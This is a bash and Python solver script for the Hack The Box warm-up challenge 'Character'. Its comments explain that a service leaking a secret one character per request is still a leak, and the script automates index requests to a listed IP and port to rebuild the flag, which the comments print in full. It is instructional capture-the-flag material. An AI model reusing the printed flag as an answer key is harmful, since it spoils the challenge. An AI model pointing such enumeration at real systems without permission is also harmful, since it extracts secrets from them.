#!/usr/bin/env bash

set -euo pipefail

# Challenge: Character
# Platform: Hack The Box
# Category: terminal / warmup
# Difficulty: very easy
#
# Scenario idea:
# The service tries to be "secure through boredom" by only revealing one
# character of the flag at a time. In the real world, this is a classic lesson:
# partial disclosure is still disclosure. If an attacker can ask the same
# question repeatedly with different offsets, they can reconstruct the entire
# secret.
#
# What the service does:
# - It asks for an integer index.
# - It returns the flag character at that index.
# - It repeats until the index is out of range.
#
# Why this is vulnerable:
# Returning secret material one byte or one character at a time is still a data
# leak. The defense only slows down a human; it does not stop automation.
#
# Manual solve idea:
# 1. Connect to the service with nc.
# 2. Ask for index 0, then 1, then 2, and so on.
# 3. Keep appending the returned characters.
# 4. Stop when the service says the index is out of range.
#
# Example manual command:
# nc 154.57.164.67 31512
#
# Automation idea:
# Use a small script that keeps one connection open, sends increasing indexes,
# parses "Character at Index N: X", and stops once "Index out of range!" appears.
#
# Final flag obtained:
# HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}

HOST="154.57.164.67"
PORT="31512"

python3 - <<'PY'
import re
import socket

HOST = "154.57.164.67"
PORT = 31512

sock = socket.create_connection((HOST, PORT), timeout=8)
sock.settimeout(2)

# Consume the initial prompt shown by the service.
sock.recv(4096)

flag = ""

for idx in range(200):
    sock.sendall(f"{idx}\n".encode())
    out = ""

    while True:
        try:
            chunk = sock.recv(4096).decode("latin1", "replace")
        except socket.timeout:
            break

        out += chunk

        if "Character at Index" in out or "out of range" in out:
            # The service often sends the result and the next prompt in two
            # separate packets. Pull one short follow-up read to stabilize the
            # parser, then continue.
            try:
                sock.settimeout(0.2)
                out += sock.recv(4096).decode("latin1", "replace")
            except Exception:
                pass
            finally:
                sock.settimeout(2)
            break

    if "out of range" in out:
        break

    match = re.search(r"Character at Index \d+: (.)", out)
    if not match:
        # Sometimes we only receive the prompt first. Read once more and retry.
        try:
            sock.settimeout(2)
            out += sock.recv(4096).decode("latin1", "replace")
        except Exception:
            pass
        match = re.search(r"Character at Index \d+: (.)", out)
        if not match:
            raise SystemExit(f"Could not parse reply for index {idx!r}: {out!r}")

    flag += match.group(1)

sock.close()
print(flag)
PY
